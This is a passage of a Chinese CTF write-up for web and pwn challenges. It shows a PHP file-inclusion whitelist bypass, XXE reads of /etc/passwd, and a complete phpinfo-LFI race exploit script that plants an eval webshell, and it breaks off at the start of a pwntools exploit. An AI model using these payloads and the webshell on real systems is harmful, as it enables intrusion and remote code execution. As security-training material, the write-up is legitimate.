class="keyword">false</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; kind::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">       <span class="keyword">echo</span> <span class="string">"&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>先进入click.php，发现：flag is not here, and flag in flag.php 得到了ﬂag的位置，那么应该是考任意文件包含漏洞<br>审计代码得到：<br>要设定page的值，且内容要在whiteList中<br>mb_substr($page,0,mb_strpos(​$page.’?’,’?’))<br>表示截取page中？之前的内容 接着对$page进行一次URLdecode之后，再判断一次。最后ﬁle的值为一个字符串 且 checkﬁle返回真值 就能包含文件ﬁle<br>所以最终payload：<br><a href="http://47.110.227.208:8003/index.php?file=source.php?../../flag.php" target="_blank" rel="noopener">http://47.110.227.208:8003/index.php?file=source.php?../../flag.php</a><br>得到一个猜密码的界面</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>猜密码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="xml">session_start();</span></span><br><span class="line"><span class="xml">$_SESSION['pwd']=time();</span></span><br><span class="line"><span class="xml">if (isset ($_POST['password'])) </span><span class="xquery">&#123;</span></span><br><span class="line"><span class="xquery">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">'pwd'</span>] == <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>])</span></span><br><span class="line"><span class="xquery">                die(<span class="string">'Flag:'</span>.<span class="variable">$flag</span>);</span></span><br><span class="line"><span class="xquery">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="xquery">                print <span class="string">'&lt;p&gt;猜测错误.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="xquery">                <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>]=time().time();</span></span><br><span class="line"><span class="xquery">        &#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"猜密码"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>需要post一个赋值了的password和一个和服务器时间的值相同的pwd，脚本如下</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup       <span class="comment">#html解析器</span></span><br><span class="line">url=<span class="string">"http://47.110.227.208:8003/index.php?file=source.php?../../flag.php"</span>    <span class="comment">#目标url</span></span><br><span class="line"></span><br><span class="line">session=requests.session()          <span class="comment">#获取一个session对象</span></span><br><span class="line">response=session.get(url)</span><br><span class="line">html=response.text                  <span class="comment">#返回的页面</span></span><br><span class="line">soup=BeautifulSoup(html,'html.parser')</span><br><span class="line"></span><br><span class="line">formData=&#123;<span class="string">"password"</span>:<span class="string">"123"</span>,<span class="string">"pwd"</span>:<span class="string">"int(time.time())"</span>&#125;<span class="comment">#构建一个formData，用于传我们的</span></span><br><span class="line">re2=session.post(url,data=formData)<span class="comment">#post过去</span></span><br><span class="line"></span><br><span class="line">if(<span class="string">"猜测错误"</span> not  in re2.text):</span><br><span class="line">    print(re2.text)</span><br></pre></td></tr></table></figure><p>发现无法获得flag，后来发现pwd赋值为空可以获得flag，可能是$_SESSION[‘pwd’]=time();没有执行成功。</p><h3 id="Simple-XXE"><a href="#Simple-XXE" class="headerlink" title="Simple XXE"></a>Simple XXE</h3><p>首先，了解一下XXE，（xml外部实体注入漏洞）<br>参考文章：<a href="https://www.cnblogs.com/cui0x01/p/8823690.html" target="_blank" rel="noopener">https://www.cnblogs.com/cui0x01/p/8823690.html</a><br>（然后跟这个文章走2333）<br>首先f12看到dom.php存在XXE，于是构造XML文本先验证漏洞，<br>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中SYSTEM “file:///etc/passwd”部分引用了目标服务器(即172.16.12.2)下的/etc/passwd文件，服务器解析XML内容后，会将这一文件内容存入&amp;xxe中，然后将数据返回给恶意访问者。<br>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上/etc/passwd文件的内容<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113909-9b4cfdf2-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113909-9b4cfdf2-a456-1.png" alt="img"></a></p><p>漏洞验证成功，<br>于是修改XML中的外部实体为其他协议，根据提示看hint，php://filter/read=convert.base64-encode/resource=hint.php， 在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113923-a423271c-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113923-a423271c-a456-1.png" alt="img"></a></p><p>解码后得到目录，<br>于是<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113936-ab5c0b66-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113936-ab5c0b66-a456-1.png" alt="img"></a></p><p>解码得到flag</p><h3 id="inclusion"><a href="#inclusion" class="headerlink" title="inclusion"></a>inclusion</h3><p>进入页面，f12，发现注释 phpinfo.php<br>然后根据名字，猜测是php文件包含漏洞（利用phpinfo）<br>参考这篇文章（又是跟着文章走）<a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a><br>访问<a href="http://47.110.227.208:8001/lfi.php?file=/etc/passwd" target="_blank" rel="noopener">http://47.110.227.208:8001/lfi.php?file=/etc/passwd</a> 验证漏洞，<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712115212-6e4f092e-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712115212-6e4f092e-a458-1.png" alt="img"></a><br>成功。<br>文章如是说：<br>先讲一下利用phpinfo上传文件，然后在文件包含的原理：</p><p>参考链接：<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p><p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。</p><p>因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。</p><p>但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：</p><p>1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；</p><p>2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大</p><p>3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接</p><p>4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p><p>5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除</p><p>6）我们可以利用这个时间差，成功包含临时文件，最后getshell<br>利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114235-163015cc-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114235-163015cc-a457-1.png" alt="img"></a></p><p>运行脚本<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114247-1d6315ec-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114247-1d6315ec-a457-1.png" alt="img"></a></p><p>（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）<br>先验证是否上传成功<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114308-2a39218a-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114308-2a39218a-a457-1.png" alt="img"></a></p><p>嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell<br>于是<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114320-30ea4d1a-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114320-30ea4d1a-a457-1.png" alt="img"></a><br>flag应该在那个奇怪名字的文件里吧<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114328-35b74f00-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114328-35b74f00-a457-1.png" alt="img"></a><br>果然，<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114335-3a4e6094-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114335-3a4e6094-a457-1.png" alt="img"></a><br>拿到flag<br>这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="hardpwn"><a href="#hardpwn" class="headerlink" title="hardpwn"></a>hardpwn</h3><p>导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="built_in">import</span> *</span><br><span class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></span><br><span class="line">context.<span class="attr">arch</span> = <span class="string">"amd64"</span></span><br><span class="line"><span class="attr">elf</span> = ELF(<span class="string">"pwn1"</span>)</span><br><span class="line"><span class="attr">sh</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">lib</span> = <span class="number">0</span></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    <span class="keyword">if</span>(<span class="attr">debug</span> == <span class="number">1</span>):</span><br><span class="line">        <span class="attr">sh</span> = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        <span class="attr">sh</span> = remote(ip,port)</span><br><span class="line">    <span class="attr">payload</span> = 